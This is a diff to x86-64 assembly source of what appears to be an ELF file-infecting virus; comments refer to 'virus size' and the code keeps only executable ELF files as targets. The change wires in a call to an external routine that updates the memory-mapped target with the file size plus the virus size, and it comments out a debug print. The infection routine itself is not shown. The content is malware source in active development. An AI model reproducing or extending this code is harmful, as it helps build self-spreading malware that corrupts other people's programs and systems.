@@ -1,6 +1,7 @@
 section .text
 	global _treat_file
 	global _final_end
+	extern _update_mmaped_file
 
 _file_size:
 	enter 24, 0
@@ -24,10 +25,10 @@ _file_size:
 
 _treat_file:
 	enter 64, 0 ; equal to push rbp - mov rbp, rsp - sub rsp, 16
-				; sub 8 bytes for mmap return address
-				; sub 8 bytes for file size
-				; sub 8 bytes for virus size
-				; sub 8 bytes for fd
+				; rsp + 0 bytes for fd
+				; rsp + 8 bytes for virus size
+				; rsp + 16 bytes for file size
+				; rsp + 24 bytes for mmap return address
 	cmp rdi, 0
 	je _final_end
 	mov QWORD [rsp + 8], rsi
@@ -79,15 +80,25 @@ _read_file_header_64:
 ;; check the file type, only exec files are treated
 	cmp WORD [rdi + 16], 2
 	jne _final_end
+
+_call_mmaped_update:
+	mov rdi, QWORD [rsp + 24]
+	mov rsi, QWORD [rsp + 16]
+	add rsi, QWORD [rsp + 8]
+	add rsi, 8
+	mov rdx, QWORD [rsp + 8]
+	mov r10, QWORD [rsp]
+	call _update_mmaped_file
+
 ;;;;;;;;;;;;;;;;;;;;;;;;
 ;; just print string for debug, will not appear in final version
-	push 0x000a6b6f
-	mov rax, 1
-	mov rdi, 1
-	mov rsi, rsp
-	mov rdx, 3
-	syscall
-	pop rdi
+;	push 0x000a6b6f
+;	mov rax, 1
+;	mov rdi, 1
+;	mov rsi, rsp
+;	mov rdx, 3
+;	syscall
+;	pop rdi
 ;;;;;;;;;;;;;;;;;;;;;;;;
 ; munmap
 _munmap:
